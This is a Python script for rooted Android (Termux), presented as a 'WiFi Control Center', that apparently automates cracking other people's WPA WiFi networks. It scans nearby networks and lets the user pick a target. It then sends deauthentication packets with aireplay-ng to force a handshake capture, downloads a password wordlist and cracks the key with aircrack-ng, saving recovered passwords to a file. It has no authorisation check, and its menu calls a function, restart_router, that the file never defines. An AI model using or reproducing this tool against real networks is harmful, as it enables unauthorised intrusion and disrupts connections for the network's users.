#!/data/data/com.termux/files/usr/bin/python

import os
import time
import json
import subprocess
import argparse
from datetime import datetime

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    """Clear terminal screen"""
    os.system('clear')

def print_banner():
    """Print cool ASCII art banner"""
    banner = f"""{Colors.CYAN}
╔══════════════════════════════════════════╗
║     {Colors.YELLOW}▀▛▘  ▗  ▗▜▘▗     {Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▞▀▖▄ ▄▐ ▐ ▄ ▄▌▗▘{Colors.CYAN}                   ║
║     {Colors.YELLOW}▌▌ ▌▐ ▐▐ ▐ ▐ ▛▌▜ {Colors.CYAN}                   ║
║     {Colors.YELLOW}▘▝▀ ▀▄▀▐▄▟▖▀▄▝▘▀▘{Colors.CYAN}                   ║
║        {Colors.BLUE}WiFi Control Center{Colors.CYAN}                  ║
╚══════════════════════════════════════════╝{Colors.RESET}"""
    print(banner)

def check_root():
    """Check if Termux has root access"""
    try:
        result = subprocess.run(['su', '-c', 'whoami'], 
                              capture_output=True, 
                              text=True)
        return result.stdout.strip() == 'root'
    except:
        return False

def check_tools():
    """Check if required tools are installed"""
    tools = ['aircrack-ng', 'airodump-ng', 'aireplay-ng']
    missing = []
    
    for tool in tools:
        try:
            subprocess.run([tool, '--help'], 
                         capture_output=True)
        except FileNotFoundError:
            missing.append(tool)
    
    if missing:
        print(f"\n{Colors.RED}Missing tools: {', '.join(missing)}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Installing required tools...{Colors.RESET}")
        try:
            subprocess.run(['pkg', 'install', 'root-repo'], check=True)
            subprocess.run(['pkg', 'install', 'x11-repo'], check=True)
            subprocess.run(['pkg', 'install', 'aircrack-ng'], check=True)
            return True
        except:
            print(f"{Colors.RED}Failed to install tools{Colors.RESET}")
            return False
    return True

def get_interface():
    """Get wireless interface name"""
    try:
        result = subprocess.run(['su', '-c', 'ip link show'], 
                              capture_output=True, 
                              text=True)
        for line in result.stdout.split('\n'):
            if 'wlan' in line:
                return line.split(':')[1].strip()
        return None
    except:
        return None

def start_monitor_mode(interface):
    """Put interface in monitor mode"""
    try:
        subprocess.run(['su', '-c', f'airmon-ng check kill'], check=True)
        subprocess.run(['su', '-c', f'airmon-ng start {interface}'], check=True)
        return f"{interface}mon"
    except Exception as e:
        print(f"{Colors.RED}Error starting monitor mode: {str(e)}{Colors.RESET}")
        return None

def stop_monitor_mode(monitor_interface):
    """Stop monitor mode"""
    try:
        subprocess.run(['su', '-c', f'airmon-ng stop {monitor_interface}'], check=True)
        subprocess.run(['su', '-c', 'service NetworkManager start'], check=True)
    except Exception as e:
        print(f"{Colors.RED}Error stopping monitor mode: {str(e)}{Colors.RESET}")

def scan_networks(monitor_interface):
    """Scan for WiFi networks"""
    try:
        print(f"\n{Colors.YELLOW}Scanning for networks...{Colors.RESET}")
        
        # Create output directory
        os.makedirs('/sdcard/wifi_scan', exist_ok=True)
        output_file = '/sdcard/wifi_scan/scan'
        
        # Start airodump-ng in background
        scan_proc = subprocess.Popen(['su', '-c', 
                                    f'airodump-ng {monitor_interface} --output-format csv -w {output_file}'],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
        
        # Scan for 10 seconds
        time.sleep(10)
        scan_proc.terminate()
        
        # Read scan results
        networks = []
        try:
            with open(f'{output_file}-01.csv', 'r') as f:
                lines = f.readlines()
                for line in lines[2:]:  # Skip header lines
                    if ',' in line:
                        parts = line.split(',')
                        if len(parts) >= 14:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            power = parts[8].strip()
                            essid = parts[13].strip()
                            if bssid and channel and essid:
                                networks.append({
                                    'bssid': bssid,
                                    'channel': channel,
                                    'power': power,
                                    'essid': essid
                                })
        except Exception as e:
            print(f"{Colors.RED}Error reading scan results: {str(e)}{Colors.RESET}")
        
        # Cleanup
        subprocess.run(['su', '-c', f'rm {output_file}*'], check=True)
        
        return networks
    except Exception as e:
        print(f"{Colors.RED}Error during scan: {str(e)}{Colors.RESET}")
        return None

def capture_handshake(monitor_interface, target_bssid, target_channel, target_essid):
    """Capture WPA handshake"""
    try:
        print(f"\n{Colors.YELLOW}Starting handshake capture for {target_essid}...{Colors.RESET}")
        
        # Create output directory
        os.makedirs('/sdcard/wifi_scan', exist_ok=True)
        output_file = f'/sdcard/wifi_scan/{target_essid}'
        
        # Set channel
        subprocess.run(['su', '-c', f'iwconfig {monitor_interface} channel {target_channel}'], check=True)
        
        # Start airodump-ng targeting the network
        dump_proc = subprocess.Popen(['su', '-c', 
                                    f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {output_file} {monitor_interface}'],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
        
        # Start deauth attack
        print(f"\n{Colors.YELLOW}Sending deauth packets to capture handshake...{Colors.RESET}")
        deauth_proc = subprocess.Popen(['su', '-c', 
                                      f'aireplay-ng --deauth 10 -a {target_bssid} {monitor_interface}'],
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
        
        # Wait for handshake
        time.sleep(30)
        
        # Cleanup
        dump_proc.terminate()
        deauth_proc.terminate()
        
        # Check if capture was successful
        cap_file = f'{output_file}-01.cap'
        if os.path.exists(cap_file):
            print(f"\n{Colors.GREEN}Handshake captured! Saved to: {cap_file}{Colors.RESET}")
            return cap_file
        else:
            print(f"\n{Colors.RED}Failed to capture handshake{Colors.RESET}")
            return None
            
    except Exception as e:
        print(f"{Colors.RED}Error during capture: {str(e)}{Colors.RESET}")
        return None

def crack_handshake(cap_file, wordlist):
    """Attempt to crack captured handshake"""
    try:
        print(f"\n{Colors.YELLOW}Starting password cracking...{Colors.RESET}")
        print(f"{Colors.YELLOW}This may take a while depending on the wordlist size.{Colors.RESET}")
        
        result = subprocess.run(['su', '-c', 
                               f'aircrack-ng {cap_file} -w {wordlist}'],
                              capture_output=True,
                              text=True)
        
        # Check if password was found
        if 'KEY FOUND!' in result.stdout:
            password = result.stdout.split('KEY FOUND! [ ')[1].split(' ]')[0]
            print(f"\n{Colors.GREEN}Password found: {password}{Colors.RESET}")
            return password
        else:
            print(f"\n{Colors.RED}Password not found in wordlist{Colors.RESET}")
            return None
            
    except Exception as e:
        print(f"{Colors.RED}Error during cracking: {str(e)}{Colors.RESET}")
        return None

def print_networks(networks):
    """Print available networks"""
    if not networks:
        print(f"\n{Colors.RED}No networks found{Colors.RESET}")
        return
        
    print(f"\n{Colors.BOLD}Available Networks:{Colors.RESET}")
    for i, net in enumerate(networks, 1):
        signal = int(net['power']) if net['power'].strip() else 0
        signal_str = '▂▄▆█' if signal > -60 else '▂▄▆' if signal > -70 else '▂▄' if signal > -80 else '▂'
        print(f"{i}. {Colors.GREEN}{net['essid']}{Colors.RESET} ({net['bssid']}) Ch:{net['channel']} {signal_str}")

def scan_wifi_passwords():
    """Scan WiFi networks and attempt to get passwords"""
    if not check_root():
        print(f"\n{Colors.RED}⚠️ Root access required!{Colors.RESET}")
        print(f"{Colors.YELLOW}Please run Termux with root access{Colors.RESET}")
        return
        
    if not check_tools():
        return
        
    interface = get_interface()
    if not interface:
        print(f"\n{Colors.RED}No wireless interface found{Colors.RESET}")
        return
        
    # Start monitor mode
    monitor_interface = start_monitor_mode(interface)
    if not monitor_interface:
        return
        
    try:
        # Scan for networks
        networks = scan_networks(monitor_interface)
        if not networks:
            return
            
        print_networks(networks)
        
        # Get target network
        while True:
            try:
                choice = int(input(f"\n{Colors.BOLD}Choose network to crack (1-{len(networks)}): {Colors.RESET}")) - 1
                if 0 <= choice < len(networks):
                    break
                print(f"\n{Colors.RED}Invalid choice!{Colors.RESET}")
            except ValueError:
                print(f"\n{Colors.RED}Invalid input!{Colors.RESET}")
            except KeyboardInterrupt:
                raise
        
        target = networks[choice]
        
        # Capture handshake
        cap_file = capture_handshake(monitor_interface, 
                                   target['bssid'], 
                                   target['channel'],
                                   target['essid'])
        
        if cap_file:
            # Download wordlist if not exists
            wordlist = '/sdcard/wifi_scan/wordlist.txt'
            if not os.path.exists(wordlist):
                print(f"\n{Colors.YELLOW}Downloading wordlist...{Colors.RESET}")
                subprocess.run(['wget', 
                              'https://github.com/danielmiessler/SecLists/raw/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt',
                              '-O', wordlist], check=True)
            
            # Attempt to crack
            password = crack_handshake(cap_file, wordlist)
            
            if password:
                # Save result
                with open('/sdcard/wifi_scan/passwords.txt', 'a') as f:
                    f.write(f"{target['essid']}: {password}\n")
                
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Operation cancelled{Colors.RESET}")
    finally:
        # Cleanup
        stop_monitor_mode(monitor_interface)

def print_menu():
    """Print interactive menu"""
    print(f"\n{Colors.BOLD}Options:{Colors.RESET}")
    print(f"1. {Colors.GREEN}Restart Router (requires root){Colors.RESET}")
    print(f"2. {Colors.YELLOW}Show WiFi Info{Colors.RESET}")
    print(f"3. {Colors.BLUE}Scan WiFi Passwords{Colors.RESET}")
    print(f"4. {Colors.RED}Exit{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='WiFi Control Center')
    parser.add_argument('-f', '--force', action='store_true', 
                       help='Force restart without confirmation')
    args = parser.parse_args()
    
    try:
        while True:
            clear_screen()
            print_banner()
            print_menu()
            
            choice = input(f"\n{Colors.BOLD}Choose an option (1-4):{Colors.RESET} ")
            
            if choice == '1':
                restart_router()
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '2':
                print(f"\n{Colors.YELLOW}WiFi info feature coming soon...{Colors.RESET}")
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '3':
                scan_wifi_passwords()
                input(f"\n{Colors.DIM}Press Enter to continue...{Colors.RESET}")
            elif choice == '4':
                print(f"\n{Colors.GREEN}Goodbye!{Colors.RESET}")
                break
            else:
                print(f"\n{Colors.RED}Invalid option!{Colors.RESET}")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {str(e)}{Colors.RESET}")

if __name__ == "__main__":
    main()
